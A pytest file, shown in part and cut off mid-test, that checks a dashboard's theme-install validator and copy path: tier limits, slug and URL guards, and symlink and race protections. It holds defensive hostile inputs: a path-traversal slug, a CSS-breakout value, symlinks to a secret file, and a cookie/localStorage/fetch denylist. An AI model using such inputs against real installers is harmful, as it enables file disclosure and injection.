"""Tests for theme install (directory store + tier-aware validation, L0/L1/L2).

Exercises the pure helpers in ``kiro_crew.dashboard.theme_validate`` and the
theme HTTP handlers in ``kiro_crew.dashboard.handlers.themes`` (plus the
persona reader in ``chat_utils``) directly — the validator is where the real
structure/security logic lives, so no aiohttp app is needed. Covers:

* L0: valid installs (top-level + styles/), missing/invalid manifest, level
  bounds (L0 declaring-but-shipping-L2), stray files, VCS/meta tolerance,
  symlink rejection, oversize, bad CSS values.
* L1: valid branding/fonts/overrides.css install; overrides.css denylist
  (@import / external url() / forbidden selector); font count cap; a font/
  branding asset in an L0 theme rejected.
* L2: valid overlays/topbar/audio/persona install; overlay/topbar HTML denylist
  (external <script src> / cookie / localStorage / fetch-URL); overlay count
  cap; persona bounds (length + mandatory drop-persona & security clauses);
  audio magic-byte sniff; per-file size cap; an L2 asset in an L1 theme rejected.
* Pure content helpers (_sniff_audio / _classify_theme_file /
  _validate_overrides_css / _validate_overlay_html / _validate_persona).
* Asset routes: _resolve_theme_asset containment/traversal/symlink guards.
* Persona injection: _installed_theme_persona slug/symlink/cap guards.
* The GitHub URL guard, recognized-file staging, copy-overwrite/re-install, and
  an install→list→remove round-trip.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import threading
from contextlib import contextmanager
from pathlib import Path
from types import ModuleType

import pytest

import kiro_crew.dashboard.handlers.themes as th_mod
import kiro_crew.dashboard.theme_validate as tv_mod
from conftest import requires_symlinks
from kiro_crew.dashboard.handlers.themes import (
    _atomic_write_theme_json,
    _clone_github,
    _copy_installed_theme,
)
from kiro_crew.dashboard.theme_validate import (
    _THEME_FILE_CAPS,
    _THEME_LOADER_ICONS,
    _THEME_LOADER_ICONS_MAX,
    _THEME_MAX_FONTS,
    _THEME_OVERLAY_DEFAULT_POSITION,
    _THEME_OVERLAY_DEFAULT_ZINDEX,
    _classify_theme_file,
    _installed_theme_dir,
    _overrides_layout_violation,
    _resolve_theme_asset,
    _safe_theme_slug,
    _slugify_theme_name,
    _sniff_audio,
    _theme_asset_descriptor,
    _validate_audio_manifest,
    _validate_overlay_decls,
    _validate_overlay_html,
    _validate_overrides_css,
    _validate_persona,
    _validate_theme_dir,
    _validate_topbar_decls,
)
from kiro_crew.slugs import slug_hash_fallback

# _validate_theme_data only *requires* --bg/--text/--accent and rejects unknown
# keys, so a 3-var map per mode is a complete, valid Level-0 theme.
_VALID_VARS = {
    "dark": {"--bg": "#000000", "--text": "#ffffff", "--accent": "#3366ff"},
    "light": {"--bg": "#ffffff", "--text": "#000000", "--accent": "#0033cc"},
}


def _write(path: Path, obj: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(obj), encoding="utf-8")


def _make_theme(
    root: Path,
    *,
    level: int = 0,
    name: str = "LCARS",
    styled: bool = False,
    variables: dict | None = None,
) -> Path:
    """Build a theme directory under ``root`` and return its path."""
    d = root / "theme"
    d.mkdir(parents=True, exist_ok=True)
    _write(
        d / "theme.json",
        {"slug": "lcars", "name": name, "emoji": "🖖", "level": level, "formatVersion": 1},
    )
    varobj = _VALID_VARS if variables is None else variables
    _write(d / ("styles/variables.json" if styled else "variables.json"), varobj)
    return d


def _allow_pinned_source_rename_on_windows(
    monkeypatch: pytest.MonkeyPatch,
    themes_module: ModuleType,
    source: Path,
) -> None:
    """Model POSIX rename semantics when the Windows pin blocks renames."""
    if not themes_module.IS_WINDOWS:
        return
    pinned_stat = source.stat()
    fake_fd = 2_147_483_647
    real_fstat = os.fstat
    real_close = os.close
    monkeypatch.setattr(themes_module, "pin_directory", lambda _path: fake_fd)
    monkeypatch.setattr(
        themes_module.os,
        "fstat",
        lambda fd: pinned_stat if fd == fake_fd else real_fstat(fd),
    )
    monkeypatch.setattr(
        themes_module.os,
        "close",
        lambda fd: None if fd == fake_fd else real_close(fd),
    )


# A valid persona: within the length cap AND carries both mandatory clauses
# (an explicit "drop persona on request" and a "security/accuracy overrides").
_VALID_PERSONA = (
    "You narrate like a retro starship computer. Drop this persona immediately "
    "whenever the user asks. Security and accuracy always override the persona."
)
# A minimal but valid MP3 header (ID3 or MPEG frame sync) for the audio sniff.
_VALID_MP3 = b"\xff\xfb\x90\x00" + b"\x00" * 64
# A valid 1x1 PNG — pack loader images are size-capped, not magic-sniffed, but a
# real signature keeps the fixture honest.
_PNG_1PX = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000a49444154789c6360000002000154a24f9b0000000049454e44ae426082"
)


def _make_tiered(
    root: Path,
    *,
    level: int,
    extra: dict[str, object] | None = None,
    slug: str | None = None,
) -> Path:
    """Build a Level 1/2 theme directory; ``extra`` maps rel-path -> str|bytes."""
    d = root / f"theme-l{level}"
    d.mkdir(parents=True, exist_ok=True)
    _write(
        d / "theme.json",
        {
            "slug": slug or f"pack-l{level}",
            "name": f"Pack L{level}",
            "emoji": "🎨",
            "level": level,
            "formatVersion": 1,
        },
    )
    _write(d / "variables.json", _VALID_VARS)
    for rel, content in (extra or {}).items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(str(content), encoding="utf-8")
    return d


# Recognized L1 asset payload (branding + a font + a clean overrides.css).
_L1_ASSETS: dict[str, object] = {
    "branding/logo.svg": "<svg xmlns='http://www.w3.org/2000/svg'></svg>",
    "styles/fonts/display.woff2": b"wOF2" + b"\x00" * 32,
    "styles/overrides.css": ".chat-bubble { border-radius: 8px; }",
}
# Recognized L2 asset payload (overlay + both topbars + audio + persona).
_L2_ASSETS: dict[str, object] = {
    "overlays/scanner.html": "<div class='scan'>scanning</div>",
    "topbar/dark.html": "<div>dark bar</div>",
    "topbar/light.html": "<div>light bar</div>",
    "audio/beep.mp3": _VALID_MP3,
    "persona.md": _VALID_PERSONA,
}


def _make_full_l2(root: Path, *, slug: str = "fixture-l2") -> Path:
    """Build a full Level-2 pack in a tmp dir: persona + overlay + both topbars
    + a font + clean overrides.css + an audio manifest, with the §3.1/§3.3
    ``overlays``/``topbar`` manifest declarations populated. This replaces the
    old shipped-sample regression — sample/test packs do not live in the
    repo (nothing theme-bearing ships in the wheel), so the full-L2 regression
    value (validates at L2, survives the copy path + re-install, exposes a
    content-bound persona descriptor) is exercised entirely from a fixture."""
    d = root / slug
    d.mkdir(parents=True, exist_ok=True)
    _write(
        d / "theme.json",
        {
            "slug": slug,
            "name": "Fixture L2",
            "emoji": "🎨",
            "level": 2,
            "formatVersion": 1,
            "overlays": [{"id": "scanner", "src": "overlays/scanner.html"}],
            "topbar": {"dark": "topbar/dark.html", "light": "topbar/light.html"},
        },
    )
    _write(d / "variables.json", _VALID_VARS)
    (d / "persona.md").write_text(_VALID_PERSONA, encoding="utf-8")
    (d / "overlays").mkdir()
    (d / "overlays" / "scanner.html").write_text(
        "<div class='scan'>scanning</div>", encoding="utf-8"
    )
    (d / "topbar").mkdir()
    (d / "topbar" / "dark.html").write_text("<div>dark bar</div>", encoding="utf-8")
    (d / "topbar" / "light.html").write_text("<div>light bar</div>", encoding="utf-8")
    (d / "styles" / "fonts").mkdir(parents=True)
    (d / "styles" / "fonts" / "display.woff2").write_bytes(b"wOF2" + b"\x00" * 32)
    (d / "styles" / "overrides.css").write_text(
        ".chat-bubble { border-radius: 8px; }", encoding="utf-8"
    )
    (d / "audio").mkdir()
    (d / "audio" / "chime.mp3").write_bytes(_VALID_MP3)
    _write(
        d / "audio" / "manifest.json",
        {"triggers": {"notification": {"src": "audio/chime.mp3", "volume": 0.5, "maxDuration": 2}}},
    )
    return d


class TestValidateThemeDir:
    def test_valid_toplevel(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_theme(tmp_path))
        assert err is None, err
        assert summary is not None
        assert summary["slug"] == "lcars"
        assert summary["name"] == "LCARS"
        assert summary["emoji"] == "🖖"
        assert summary["level"] == 0
        assert summary["source"] == "installed"
        assert summary["dark"]["--bg"] == "#000000"
        assert summary["light"]["--text"] == "#000000"

    def test_valid_styles_subdir(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_theme(tmp_path, styled=True))
        assert err is None, err
        assert summary is not None and summary["slug"] == "lcars"

    def test_missing_manifest(self, tmp_path: Path) -> None:
        d = tmp_path / "t"
        _write(d / "variables.json", _VALID_VARS)
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "theme.json" in err

    def test_missing_variables(self, tmp_path: Path) -> None:
        d = tmp_path / "t"
        _write(d / "theme.json", {"slug": "x", "name": "X", "level": 0, "formatVersion": 1})
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "variables.json" in err

    def test_level_above_max_rejected(self, tmp_path: Path) -> None:
        # Levels 0–2 are all valid now (tier feature); only a level ABOVE
        # _THEME_MAX_LEVEL is rejected. A level-2 manifest with no higher-tier
        # assets is accepted.
        summary, err = _validate_theme_dir(_make_theme(tmp_path / "hi", level=3))
        assert summary is None
        assert err is not None and "0, 1, or 2" in err
        summary, err = _validate_theme_dir(_make_theme(tmp_path / "ok", level=2))
        assert err is None, err
        assert summary is not None and summary["level"] == 2

    def test_level_one_loader_icons_are_accepted_and_described(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path, level=1)
        manifest = json.loads((d / "theme.json").read_text("utf-8"))
        manifest["loaderIcons"] = ["star", "sparkles", "moon", "cloud"]
        _write(d / "theme.json", manifest)
        summary, err = _validate_theme_dir(d, installing=True)
        assert err is None, err
        assert summary is not None
        descriptor = _theme_asset_descriptor(d, manifest, 1)
        assert descriptor["loaderIcons"] == manifest["loaderIcons"]

    @pytest.mark.parametrize(
        ("level", "icons", "message"),
        [
            (0, ["star", "sparkles", "moon", "cloud"], "requires level 1"),
            (1, None, "must be an array"),
            (1, "star", "must be an array"),
            (1, ["star", "moon", "cloud"], "must contain"),
            (1, ["star", "sparkles", "moon", "unknown"], "unknown symbol"),
            (1, ["star", "sparkles", "moon", "star"], "must be unique"),
        ],
    )
    def test_invalid_loader_icons_are_rejected(
        self, tmp_path: Path, level: int, icons: object, message: str
    ) -> None:
        d = _make_theme(tmp_path, level=level)
        manifest = json.loads((d / "theme.json").read_text("utf-8"))
        manifest["loaderIcons"] = icons
        _write(d / "theme.json", manifest)
        summary, err = _validate_theme_dir(d, installing=True)
        assert summary is None
        assert err is not None and message in err

    def test_backend_loader_icon_allowlist_matches_frontend(self) -> None:
        frontend = (
            Path(__file__).parents[1] / "website" / "src" / "themeLoaderIcons.ts"
        ).read_text("utf-8")
        declared = set(re.findall(r"^  ([a-z]+): [A-Z]", frontend, re.MULTILINE))
        assert declared == _THEME_LOADER_ICONS
        assert _THEME_LOADER_ICONS_MAX == len(declared)

    def test_pack_loader_images_accepted_and_described(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path, level=1)
        (d / "loader").mkdir()
        for i in range(4):
            (d / "loader" / f"{i}.png").write_bytes(_PNG_1PX)
        manifest = json.loads((d / "theme.json").read_text("utf-8"))
        summary, err = _validate_theme_dir(d, installing=True)
        assert err is None, err
        descriptor = _theme_asset_descriptor(d, manifest, 1)
        assert descriptor["loaderImages"] == [
            "loader/0.png", "loader/1.png", "loader/2.png", "loader/3.png",
        ]

    @pytest.mark.parametrize("count", [9, 12])
    def test_pack_loader_images_out_of_range_rejected(
        self, tmp_path: Path, count: int
    ) -> None:
        d = _make_theme(tmp_path, level=1)
        (d / "loader").mkdir()
        for i in range(count):
            (d / "loader" / f"{i}.png").write_bytes(_PNG_1PX)
        summary, err = _validate_theme_dir(d, installing=True)
        assert summary is None
        assert err is not None and "loader/" in err

    def test_pack_loader_single_image_accepted(self, tmp_path: Path) -> None:
        # One image is a valid loader on its own (rendered directly, not cycled).
        d = _make_theme(tmp_path, level=1)
        (d / "loader").mkdir()
        (d / "loader" / "spin.webp").write_bytes(_PNG_1PX)
        manifest = json.loads((d / "theme.json").read_text("utf-8"))
        summary, err = _validate_theme_dir(d, installing=True)
        assert err is None, err
        descriptor = _theme_asset_descriptor(d, manifest, 1)
        assert descriptor["loaderImages"] == ["loader/spin.webp"]

    def test_pack_loader_svg_and_gif_accepted(self, tmp_path: Path) -> None:
        # SVG rides the same <img>-secure-mode asset path as logo.svg; GIF/animated
        # formats self-animate in the <img>. Both are valid loader images.
        d = _make_theme(tmp_path, level=1)
        (d / "loader").mkdir()
        (d / "loader" / "a.svg").write_text(
            "<svg xmlns='http://www.w3.org/2000/svg'><circle r='4'/></svg>",
            encoding="utf-8",
        )
        (d / "loader" / "b.gif").write_bytes(_PNG_1PX)
        manifest = json.loads((d / "theme.json").read_text("utf-8"))
        summary, err = _validate_theme_dir(d, installing=True)
        assert err is None, err
        descriptor = _theme_asset_descriptor(d, manifest, 1)
        assert descriptor["loaderImages"] == ["loader/a.svg", "loader/b.gif"]

    def test_l2_overlay_asset_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)  # declares level 0 but ships an overlay
        (d / "overlays").mkdir()
        (d / "overlays" / "scanner.html").write_text("<b>x</b>", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "level 2" in err.lower()

    def test_persona_asset_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / "persona.md").write_text("# persona", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "level 2" in err.lower()

    def test_stray_file_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / "evil.txt").write_text("x", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "unexpected file" in err

    def test_meta_files_tolerated(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / ".gitignore").write_text("x", encoding="utf-8")
        (d / "LICENSE").write_text("MIT", encoding="utf-8")
        gitdir = d / ".git"
        gitdir.mkdir()
        (gitdir / "config").write_text("[core]", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert err is None, err
        assert summary is not None and summary["slug"] == "lcars"

    def test_symlink_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        outside = tmp_path / "outside.json"
        outside.write_text("{}", encoding="utf-8")
        try:
            (d / "readme.md").symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "symlink" in err.lower()

    def test_bad_css_value_rejected(self, tmp_path: Path) -> None:
        bad = {
            "dark": {"--bg": "red; }", "--text": "#fff", "--accent": "#00f"},
            "light": {"--bg": "#fff", "--text": "#000", "--accent": "#00c"},
        }
        summary, err = _validate_theme_dir(_make_theme(tmp_path, variables=bad))
        assert summary is None
        assert err is not None  # rejected by _validate_theme_data

    def test_oversize_variables_rejected(self, tmp_path: Path) -> None:
        d = tmp_path / "t"
        _write(d / "theme.json", {"slug": "x", "name": "X", "level": 0, "formatVersion": 1})
        padded = dict(_VALID_VARS)
        padded["_pad"] = "x" * (70 * 1024)  # push variables.json past 64KB
        _write(d / "variables.json", padded)
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "too large" in err


class TestFormatVersion:
    """theme.json ``formatVersion`` gate (arbiter item 1). Checked before any
    other schema error, so a forward-incompatible pack gets an honest 'needs a
    newer KiroCrew' message rather than an opaque downstream error."""

    def _fmt_theme(self, tmp_path: Path, fmt: object, *, omit: bool = False) -> Path:
        # _make_theme already writes a valid formatVersion:1 manifest; overwrite
        # theme.json with the value under test (or omit the key entirely).
        d = _make_theme(tmp_path)
        manifest: dict[str, object] = {"slug": "lcars", "name": "LCARS", "emoji": "🖖", "level": 0}
        if not omit:
            manifest["formatVersion"] = fmt
        _write(d / "theme.json", manifest)
        return d

    def test_format_version_1_passes(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, 1))
        assert err is None, err
        assert summary is not None and summary["slug"] == "lcars"

    def test_missing_format_version_rejected(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, None, omit=True))
        assert summary is None
        assert err is not None and 'must declare "formatVersion"' in err

    def test_newer_format_version_rejected(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, 2))
        assert summary is None
        assert err is not None
        assert "requires a newer version of Kiro Crew" in err
        assert "formatVersion 2" in err and "supported 1" in err

    @pytest.mark.parametrize("bad", ["1", 1.5, None, True])
    def test_non_int_format_version_rejected(self, tmp_path: Path, bad: object) -> None:
        # A string, float, null, or bool is not an integer -> the declare-message
        # (checked before the level/name/variables schema).
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, bad))
        assert summary is None
        assert err is not None and 'must declare "formatVersion"' in err

    def test_below_one_rejected(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, 0))
        assert summary is None
        assert err is not None and "positive integer" in err


class TestSafeThemeSlug:
    def test_valid_slug(self) -> None:
        assert _safe_theme_slug("lcars-01") == "lcars-01"

    @pytest.mark.parametrize("bad", ["../etc", "a/b", "", "Foo", "a.b", "x y"])
    def test_unsafe_rejected(self, bad: str) -> None:
        assert _safe_theme_slug(bad) is None


class TestCloneGithubGuard:
    """The URL guard runs before any subprocess — no network/git required."""

    def test_non_https_rejected(self, tmp_path: Path) -> None:
        err = _clone_github("http://github.com/u/r", tmp_path / "c")
        assert err is not None and "https" in err

    def test_non_github_host_rejected(self, tmp_path: Path) -> None:
        err = _clone_github("https://evil.example.com/u/r", tmp_path / "c")
        # Assert on the rejection phrase, not a bare domain substring
        # (CodeQL flags `"github.com" in x` as URL-substring sanitization).
        assert err is not None and "only https" in err

    def test_empty_url_rejected(self, tmp_path: Path) -> None:
        assert _clone_github("", tmp_path / "c") is not None


class TestAtomicWriteThemeJson:
    """Guards the create/update TOCTOU fix: writes go through a temp file +
    os.replace so a concurrent same-slug writer can never observe a torn file,
    and a failed write leaves neither a partial target nor a leftover temp."""

    def test_writes_valid_json_no_temp_left(self, tmp_path: Path) -> None:
        target = tmp_path / "sunset.json"
        _atomic_write_theme_json(target, json.dumps({"slug": "sunset"}) + "\n")
        assert json.loads(target.read_text("utf-8")) == {"slug": "sunset"}
        # No leftover ".sunset-*.tmp" scratch files in the directory.
        assert list(tmp_path.glob(".sunset-*.tmp")) == []

    def test_overwrite_is_atomic_and_complete(self, tmp_path: Path) -> None:
        target = tmp_path / "sunset.json"
        _atomic_write_theme_json(target, json.dumps({"v": 1}) + "\n")
        _atomic_write_theme_json(target, json.dumps({"v": 2}) + "\n")
        # os.replace overwrites in place — the new complete content wins, and
        # exactly one file exists (no torn half-write, no temp residue).
        assert json.loads(target.read_text("utf-8")) == {"v": 2}
        assert list(tmp_path.glob(".sunset-*.tmp")) == []

    def test_failed_write_leaves_no_partial_or_temp(self, tmp_path: Path) -> None:
        target = tmp_path / "sunset.json"
        # A non-str payload makes the text-mode write raise mid-helper (after
        # mkstemp, before os.replace) — the except path must unlink the temp and
        # leave the target absent (never a partial file).
        with pytest.raises(TypeError):
            _atomic_write_theme_json(target, 123)  # type: ignore[arg-type]
        assert not target.exists()
        assert list(tmp_path.glob(".sunset-*.tmp")) == []


class TestThemeInstallGovernanceAudit:
    """The theme-install admission decision must land in the SEL audit trail for
    BOTH the allowed and denied outcomes, and the audit must never wedge install."""

    def test_allowed_and_denied_emit_sel(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.sel as sel_mod
        from kiro_crew.dashboard.handlers import themes as th

        calls: list[dict] = []

        class _Recorder:
            def log_governance_decision(self, **kw: object) -> None:
                calls.append(kw)

        monkeypatch.setattr(sel_mod, "sel", lambda: _Recorder())

        class _Decision:
            permitted = False
            rule = "capabilities.theme_install"
            layer = "policy"
            reason = "disabled by enterprise policy"

        th._audit_theme_install_governance("allowed", _Decision())
        th._audit_theme_install_governance("denied", _Decision())

        assert [c["outcome"] for c in calls] == ["allowed", "denied"]
        assert calls[0]["scope"] == "capabilities.theme_install"
        assert calls[0]["tool_name"] == "api_themes_install"
        assert calls[1]["reason"] == "disabled by enterprise policy"

    def test_never_raises_when_sel_unavailable(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.sel as sel_mod
        from kiro_crew.dashboard.handlers import themes as th

        def _boom() -> object:
            raise RuntimeError("sel backend down")

        monkeypatch.setattr(sel_mod, "sel", _boom)
        # decision=None (governance-unavailable path) + broken SEL must be silent.
        th._audit_theme_install_governance("denied", None, reason="governance unavailable")


class TestCopyInstalledTheme:
    def test_copies_only_recognized_files(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / "LICENSE").write_text("MIT", encoding="utf-8")
        dst = tmp_path / "dst"
        _copy_installed_theme(d, dst)
        assert (dst / "theme.json").is_file()
        assert (dst / "variables.json").is_file()
        assert not (dst / "LICENSE").exists()

    def test_preserves_styles_location(self, tmp_path: Path) -> None:
        dst = tmp_path / "dst"
        _copy_installed_theme(_make_theme(tmp_path, styled=True), dst)
        assert (dst / "styles" / "variables.json").is_file()

    def test_symlinked_file_rejected(self, tmp_path: Path) -> None:
        # TOCTOU (Codex HIGH): a file swapped for a symlink after validation must
        # be REFUSED by the copy loop, never dereferenced+served. The old
        # copytree(symlinks=False) would have copied the target's bytes.
        secret = tmp_path / "secret.txt"
        secret.write_text("TOP SECRET", encoding="utf-8")
        d = _make_theme(tmp_path)
        try:
            (d / "readme.md").symlink_to(secret)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        dst = tmp_path / "dst"
        with pytest.raises(ValueError):
            _copy_installed_theme(d, dst)
        # Nothing from the symlink target leaked into the staging tree.
        assert not (dst / "readme.md").exists()

    def test_symlinked_dir_rejected(self, tmp_path: Path) -> None:
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "leak.txt").write_text("x", encoding="utf-8")
        d = _make_theme(tmp_path)
        try:
            (d / "branding").symlink_to(outside, target_is_directory=True)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        with pytest.raises(ValueError):
            _copy_installed_theme(d, tmp_path / "dst")

    def test_full_l2_pack_survives_copy_path(self, tmp_path: Path) -> None:
        # A full L2 pack (persona + overlays + topbar + fonts + audio manifest)
        # built in a tmp dir installs cleanly through the symlink-rejecting copy
        # loop, and re-install overwrites in place (no false positives). Replaces
        # the old shipped-sample regression now that packs live outside the repo.
        src = _make_full_l2(tmp_path / "src")
        dst = tmp_path / "dst"
        _copy_installed_theme(src, dst)
        assert (dst / "theme.json").is_file()
        assert (dst / "persona.md").is_file()
        # Re-copy overwrites the same slug without error (re-install path).
        _copy_installed_theme(src, dst)
        assert (dst / "theme.json").is_file()

    def test_oversized_source_rejected_by_copy_budget(self, tmp_path: Path) -> None:
        # A regular file swapped for a huge one
        # after any earlier walk must not exhaust memory / land in staging —
        # the copy loop enforces a hard cumulative byte ceiling itself.
        from kiro_crew.dashboard.theme_validate import _THEME_TOTAL_BYTES_BY_LEVEL

        budget = max(_THEME_TOTAL_BYTES_BY_LEVEL.values())
        d = _make_theme(tmp_path)
        (d / "branding").mkdir(exist_ok=True)
        with (d / "branding" / "logo.png").open("wb") as f:
            f.seek(budget + 1)
            f.write(b"\0")
        dst = tmp_path / "dst"
        with pytest.raises(ValueError, match="maximum install size"):
            _copy_installed_theme(d, dst)
        assert not (dst / "branding" / "logo.png").exists()

    def test_source_containing_themes_dir_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Staging lives inside _themes_dir(), so a source
        # equal to (or an ancestor of) the themes dir would make the copy walk
        # recursively consume its own staging output (unbounded nesting →
        # ENAMETOOLONG → residue). Must 400 by containment, leaving no residue.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        themes_root = tv_mod._themes_dir()
        themes_root.mkdir(parents=True, exist_ok=True)
        for bad in (tmp_path / "cfg", themes_root):
            theme, err, status = th_mod._do_install("local", {"path": str(bad)})
            assert theme is None and status == 400, (bad, err, status)
            assert not any(p.name.startswith(".install-staging-") for p in themes_root.iterdir())

    def test_dest_ancestor_of_source_rejected_without_deleting_source(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Promotion displaces dest to `.old` and rmtree()s it. A source
        # nested UNDER the directory its own slug names (dest is an ancestor)
        # rides along in that displaced tree. Deleting the tree removes the
        # source and unrelated siblings while the handler returns 200.
        # The containment guard must return 400 with the source AND a sibling
        # file intact and no staging residue. Status alone is not enough: a
        # reject-after-delete implementation would still return 400.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        themes_root = tv_mod._themes_dir()
        src = themes_root / "lcars" / "subpack"
        src.mkdir(parents=True)
        _write(
            src / "theme.json",
            {"slug": "lcars", "name": "LCARS", "emoji": "🖖", "level": 0, "formatVersion": 1},
        )
        _write(src / "variables.json", _VALID_VARS)
        sibling = themes_root / "lcars" / "unrelated-sibling.txt"
        sibling.write_text("precious", encoding="utf-8")

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert theme is None and status == 400, (theme, err, status)
        assert err is not None and "inside the install destination" in err
        assert (src / "theme.json").is_file(), "install deleted its own source"
        assert sibling.is_file(), "install deleted an unrelated sibling"
        assert not any(p.name.startswith(".install-staging-") for p in themes_root.iterdir())

    def test_source_moved_under_dest_while_waiting_for_lock_is_preserved(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The source identity is pinned before lock acquisition. If the source
        # moves beneath dest in that window, promotion restores the displaced
        # tree and rejects the install without deleting source bytes.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        themes_root = tv_mod._themes_dir()
        src = _make_theme(tmp_path / "source")
        _allow_pinned_source_rename_on_windows(monkeypatch, th_mod, src)
        expected_manifest = (src / "theme.json").read_bytes()
        expected_variables = (src / "variables.json").read_bytes()
        relocated = themes_root / "lcars" / "relocated-source"
        real_install_lock = th_mod._theme_install_lock

        @contextmanager
        def _relocating_lock(slug: str):  # type: ignore[no-untyped-def]
            relocated.parent.mkdir(parents=True, exist_ok=True)
            src.rename(relocated)
            with real_install_lock(slug):
                yield

        monkeypatch.setattr(th_mod, "_theme_install_lock", _relocating_lock)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert theme is None and status == 400, (theme, err, status)
        assert err is not None and "moved into the install destination" in err
        assert (relocated / "theme.json").read_bytes() == expected_manifest
        assert (relocated / "variables.json").read_bytes() == expected_variables
        assert not list(themes_root.glob(".install-staging-*"))
        assert not list(themes_root.glob(".lcars.old-*"))

    def test_source_decoy_swap_while_waiting_for_lock_is_preserved(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        themes_root = tv_mod._themes_dir()
        src = _make_theme(tmp_path / "source")
        _allow_pinned_source_rename_on_windows(monkeypatch, th_mod, src)
        expected_manifest = (src / "theme.json").read_bytes()
        expected_variables = (src / "variables.json").read_bytes()
        relocated = themes_root / "lcars" / "relocated-source"
        real_install_lock = th_mod._theme_install_lock

        def _swap_source() -> None:
            relocated.parent.mkdir(parents=True, exist_ok=True)
            src.rename(relocated)
            src.mkdir()
            (src / "decoy.txt").write_text("decoy", encoding="utf-8")

        # The pathname hook makes the vulnerable late stat capture the decoy.
        # The lock hook drives the same swap when identity comes from the early
        # descriptor instead, so both implementations exercise one race.
        real_path_stat = Path.stat

        def _stat_with_pre_lock_swap(
            path: Path, *args: object, **kwargs: object
        ) -> os.stat_result:
            if (
                path == src
                and not relocated.exists()
                and any(themes_root.glob(".install-staging-*"))
            ):
                _swap_source()
            return real_path_stat(path, *args, **kwargs)

        def _swapping_lock(slug: str):  # type: ignore[no-untyped-def]
            if not relocated.exists():
                _swap_source()
            return real_install_lock(slug)

        monkeypatch.setattr(Path, "stat", _stat_with_pre_lock_swap)
        monkeypatch.setattr(th_mod, "_theme_install_lock", _swapping_lock)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert theme is None and status == 400, (theme, err, status)
        assert err is not None and "moved into the install destination" in err
        assert (relocated / "theme.json").read_bytes() == expected_manifest
        assert (relocated / "variables.json").read_bytes() == expected_variables
        assert (src / "decoy.txt").read_text(encoding="utf-8") == "decoy"
        assert not list(themes_root.glob(".install-staging-*"))
        assert not list(themes_root.glob(".lcars.old-*"))

    def test_vanished_source_pin_returns_400_before_staging(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        themes_root = tv_mod._themes_dir()
        src = _make_theme(tmp_path / "source")

        def _missing_source(_path: object) -> int:
            raise FileNotFoundError

        monkeypatch.setattr(th_mod, "pin_directory", _missing_source)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert theme is None and status == 400, (theme, err, status)
        assert err == "source directory is not accessible"
        assert not list(themes_root.glob(".install-staging-*"))
        assert not list(themes_root.glob(".lcars.old-*"))

    def test_dest_case_variant_ancestor_rejected_on_case_insensitive_fs(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
